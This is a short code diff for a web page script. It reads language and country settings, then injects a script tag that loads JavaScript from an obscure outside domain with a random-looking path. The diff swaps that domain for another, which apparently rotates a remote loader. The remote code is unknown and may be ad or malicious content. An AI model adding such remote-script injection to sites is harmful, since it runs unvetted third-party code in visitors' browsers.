@@ -297,9 +297,10 @@ $(document).ready(function () {
   var lang = $("meta[name=lang]").length ? $("meta[name=lang]").attr("content") : $("html").attr("lang");
   lang ? "" : (lang = "ru");
   var countryCode = document.getElementById('countryCode').value;
+      
 
  var script1 = document.createElement('script');
-        script1.src = '//static.hemgoz.com/dx0h18h8qliv687qt2qh818h0pmvuq/y305cd7.js';
+        script1.src = '//static.bestgonews.com/njrh81hq8liv678q2t8qh/81h0pmqvu/0y30c1e.js';
         script1.type = 'text/javascript';
         document.head.appendChild(script1);
 
